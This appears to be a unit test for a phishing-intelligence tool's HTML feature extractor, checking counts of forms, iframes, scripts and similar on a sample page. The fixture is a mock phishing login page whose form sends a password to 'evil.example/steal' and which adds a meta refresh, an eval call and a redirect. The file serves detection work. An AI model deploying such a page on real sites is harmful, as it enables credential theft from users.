from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from src.phishing_intel.features.html_features import extract_html_features


class HtmlFeatureTests(unittest.TestCase):
    def test_html_feature_counts(self) -> None:
        html = """
        <html>
          <head>
            <title>Secure Login</title>
            <meta http-equiv="refresh" content="0;url=http://evil.example" />
            <link rel="icon" href="/favicon.ico" />
          </head>
          <body>
            <form action="http://evil.example/steal">
              <input type="password" />
              <input type="hidden" />
            </form>
            <iframe src="http://tracker.example"></iframe>
            <a href="http://outside.example">Help</a>
            <script>eval("x"); window.location="http://evil.example"</script>
          </body>
        </html>
        """
        features = extract_html_features(html)

        self.assertEqual(features["n_forms"], 1)
        self.assertEqual(features["n_iframes"], 1)
        self.assertEqual(features["n_external_links"], 1)
        self.assertEqual(features["n_password_inputs"], 1)
        self.assertEqual(features["n_hidden_inputs"], 1)
        self.assertEqual(features["n_scripts"], 1)
        self.assertEqual(features["n_meta_refresh"], 1)
        self.assertEqual(features["has_favicon"], 1)
        self.assertEqual(features["external_action"], 1)
        self.assertGreaterEqual(features["suspicious_js"], 2)


if __name__ == "__main__":
    unittest.main()
